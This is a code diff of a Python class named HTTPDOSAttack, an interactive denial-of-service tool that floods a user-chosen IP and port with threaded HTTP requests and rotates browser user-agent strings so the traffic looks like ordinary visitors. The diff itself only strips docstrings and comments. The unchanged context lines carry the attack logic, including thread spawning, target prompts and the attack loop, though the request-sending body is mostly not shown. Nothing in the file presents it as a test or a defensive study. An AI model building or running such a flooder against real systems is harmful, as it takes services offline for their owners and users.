@@ -8,8 +8,6 @@ from ui.console import cprint, iprint, wprint, eprint, cinput
 
 
 class HTTPDOSAttack:
-    """HTTP Denial of Service attack using request flooding"""
-    
     USER_AGENTS = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
@@ -33,7 +31,6 @@ class HTTPDOSAttack:
         self.lock = threading.Lock()
     
     def validate_target(self, ip_address):
-        """Validate IP address format"""
         try:
             socket.inet_aton(ip_address)
             return True
@@ -41,11 +38,9 @@ class HTTPDOSAttack:
             return False
     
     def get_random_user_agent(self):
-        """Return a random user agent string"""
         return random.choice(self.USER_AGENTS)
     
     def send_request(self):
-        """Send HTTP request to target"""
         if not self.running:
             return
         
@@ -75,14 +70,12 @@ class HTTPDOSAttack:
             pass
     
     def worker_thread(self):
-        """Worker thread that sends multiple requests"""
         for _ in range(self.request_count // self.thread_count):
             if not self.running:
                 break
             self.send_request()
     
     def run_attack(self):
-        """Execute the HTTP DOS attack"""
         try:
             iprint(f"\n[*] Starting attack on {self.target_ip}:{self.target_port}")
             iprint(f"[*] Threads: {self.thread_count} | Requests per thread: {self.request_count // self.thread_count}")
@@ -92,13 +85,11 @@ class HTTPDOSAttack:
             self.request_sent_count = 0
             threads = []
             
-            # Start worker threads
             for _ in range(self.thread_count):
                 t = threading.Thread(target=self.worker_thread, daemon=True)
                 t.start()
                 threads.append(t)
             
-            # Wait for all threads to complete
             for t in threads:
                 t.join()
             
@@ -110,11 +101,9 @@ class HTTPDOSAttack:
             wprint("\n[-] Attack stopped by user")
     
     def run_interactive(self):
-        """Interactive mode for HTTP DOS attack"""
         try:
             cprint("\n=== HTTP DOS Attack ===\n")
             
-            # Get target IP
             while True:
                 ip_input = cinput("Enter target IP address: ")
                 if self.validate_target(ip_input):
@@ -123,7 +112,6 @@ class HTTPDOSAttack:
                 else:
                     eprint("Invalid IP address format")
             
-            # Get target port
             while True:
                 try:
                     port_input = cinput("Enter target port [80]: ")
@@ -139,7 +127,6 @@ class HTTPDOSAttack:
                 except ValueError:
                     eprint("Invalid port number")
             
-            # Get thread count
             while True:
                 try:
                     thread_input = cinput("Number of concurrent threads [50]: ")
@@ -155,7 +142,6 @@ class HTTPDOSAttack:
                 except ValueError:
                     eprint("Invalid thread count")
             
-            # Get request count
             while True:
                 try:
                     request_input = cinput("Number of total requests [1000]: ")
@@ -171,14 +157,12 @@ class HTTPDOSAttack:
                 except ValueError:
                     eprint("Invalid request count")
             
-            # Display configuration
             cprint("\n[*] Configuration:")
             iprint(f"    Target: {self.target_ip}:{self.target_port}")
             iprint(f"    Threads: {self.thread_count}")
             iprint(f"    Total Requests: {self.request_count}")
             iprint("    Status: Ready to attack\n")
             
-            # Start attack
             self.run_attack()
         
         except KeyboardInterrupt:
